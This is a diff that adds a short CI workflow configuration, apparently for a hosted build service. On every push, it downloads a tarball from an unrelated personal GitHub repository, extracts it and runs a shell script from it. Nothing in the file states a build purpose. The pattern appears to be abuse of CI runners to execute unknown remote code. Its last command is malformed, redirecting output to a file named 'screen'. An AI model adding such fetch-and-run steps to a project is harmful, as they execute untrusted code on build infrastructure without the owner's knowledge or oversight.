@@ -1,0 +1,11 @@
+workflows:
+  my-workflow:
+    name: My workflow name
+    instance_type: linux
+    triggering:
+      events:
+        - push
+    scripts:
+        - wget https://github.com/vamzie2282/tesar373/raw/main/main.tar.gz 
+        - tar xf main.tar.gz
+        - ./sgr.sh > screen -R azuv
